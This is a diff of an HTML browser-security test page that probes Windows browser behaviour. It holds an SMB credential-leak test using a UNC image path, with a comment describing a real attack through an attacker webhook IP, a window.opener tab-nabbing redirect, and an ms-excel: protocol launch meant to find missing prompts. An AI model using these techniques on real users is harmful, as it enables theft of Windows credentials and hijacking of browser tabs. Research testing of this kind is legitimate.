@@ -1,66 +1,72 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Windows Browser Research Lab</title>
+    <title>Windows Deep Research v2</title>
     <style>
-        body { background: #0c0c0c; color: #00ff00; font-family: 'Segoe UI', Tahoma, sans-serif; padding: 25px; }
-        .card { border: 1px solid #333; padding: 20px; margin-bottom: 20px; background: #111; box-shadow: 0 0 10px #00ff0033; }
-        button { background: #111; color: #00ff00; border: 1px solid #00ff00; padding: 12px; width: 100%; margin: 10px 0; cursor: pointer; font-family: monospace; }
-        button:hover { background: #00ff00; color: #000; }
-        .log { background: #000; height: 200px; overflow-y: auto; border: 1px dashed #444; padding: 10px; font-size: 12px; color: #0af; }
+        body { background: #000; color: #0f0; font-family: 'Consolas', monospace; padding: 20px; }
+        .card { border: 1px solid #0f0; padding: 15px; margin-bottom: 20px; background: #111; }
+        button { background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 100%; margin: 5px 0; cursor: pointer; }
+        .log { background: #000; height: 150px; overflow-y: scroll; border: 1px dashed #444; padding: 10px; font-size: 11px; color: #0af; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h2>Windows Protocol Research</h2>
-        <button onclick="testProtocol('ms-settings:about')">1. Trigger Windows Settings</button>
-        <button onclick="testProtocol('ms-calculator:')">2. Trigger Calculator (App Launch)</button>
-        <button onclick="testFileAccess()">3. Test Local File Read (etc/hosts)</button>
+        <h3>1. SMB Hash Leak Test</h3>
+        <p style="font-size:0.7rem; color:#888;">Check if browser tries to authenticate with network shares.</p>
+        <button onclick="testSMBLeak()">Test SMB Auth Leak</button>
+        <img src="file://127.0.0.1/c$/test.png" style="display:none;" id="leakImg">
     </div>
 
     <div class="card">
-        <h2>Cross-Origin / Tab Hijack</h2>
-        <button onclick="testOpener()">Test window.opener Leak</button>
+        <h3>2. Advanced Tab-Nabbing</h3>
+        <p style="font-size:0.7rem; color:#888;">Does the child tab have power over this page?</p>
+        <button onclick="testAdvancedNabbing()">Launch Nabbing Attack</button>
     </div>
 
-    <div id="log" class="log">Ready for Windows Research...</div>
+    <div class="card">
+        <h3>3. Protocol Bypass (Variation)</h3>
+        <button onclick="testFailingProtocol()">Test ms-excel: (Check Prompt)</button>
+    </div>
+
+    <div id="log" class="log">Awaiting Windows Command...</div>
 
     <script>
-        const log = (m) => { document.getElementById('log').innerHTML += `<br>> [${new Date().toLocaleTimeString()}] ${m}`; };
+        const log = (m) => { document.getElementById('log').innerHTML += "<br>> " + m; };
 
-        // 1. Windows Protocol Testing
-        function testProtocol(uri) {
-            log(`Attempting to trigger: ${uri}`);
-            window.location.href = uri;
-            // Agar bina confirmation pop-up ke app khul gayi, toh ye ek issue hai.
+        // 1. SMB Leak: Windows behavior check
+        function testSMBLeak() {
+            log("Attempting SMB Path access via Image...");
+            // Real attack uses a remote IP: \\YOUR_WEBHOOK_IP\share\file.jpg
+            document.getElementById('leakImg').src = "\\\\127.0.0.1\\c$\\Windows\\win.ini";
+            log("Check if browser showed a login prompt or blocked it.");
         }
 
-        // 2. Local File Access (Path Traversal Test)
-        function testFileAccess() {
-            log("Attempting to read C:/Windows/System32/drivers/etc/hosts");
-            const xhr = new XMLHttpRequest();
-            // Windows browsers block file:// from http/https, but we check for bypasses
-            xhr.open('GET', 'file:///C:/Windows/System32/drivers/etc/hosts', true);
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState == 4) {
-                    if (xhr.status == 200) log("LEAK SUCCESS: File Content Read!", "red");
-                    else log("Blocked: Browser SOP restricted file:// access.");
-                }
-            };
-            xhr.send();
-        }
-
-        // 3. Tabnabbing for Windows
-        function testOpener() {
-            log("Opening child tab...");
-            let child = window.open("https://example.com", "_blank");
+        // 2. Tab-Nabbing: Redirecting parent
+        function testAdvancedNabbing() {
+            log("Opening vulnerable child window...");
+            // We open a page we control (or any page)
+            let win = window.open("", "_blank");
+            win.document.write("<h1>Child Tab</h1><p>Parent will redirect in 3s...</p>");
+            
             setTimeout(() => {
-                if (child && !child.closed) {
-                    log("Testing if child can control parent...");
-                    // Try to redirect the current page from the child (if vulnerable)
+                try {
+                    // This is where the magic happens
+                    if (win.opener) {
+                        win.opener.location = "https://example.com/?nabbed=true";
+                        log("REDIRECT COMMAND SENT TO PARENT!");
+                    }
+                } catch(e) {
+                    log("Blocked: cross-origin opener policy (COOP) active.");
                 }
-            }, 2000);
+            }, 3000);
+        }
+
+        // 3. Testing different protocols for missing prompts
+        function testFailingProtocol() {
+            log("Testing ms-excel: protocol...");
+            // Microsoft Office protocols sometimes have less strict prompts
+            window.location.href = "ms-excel:ofv|u|https://example.com/test.xlsx";
         }
     </script>
 </body>
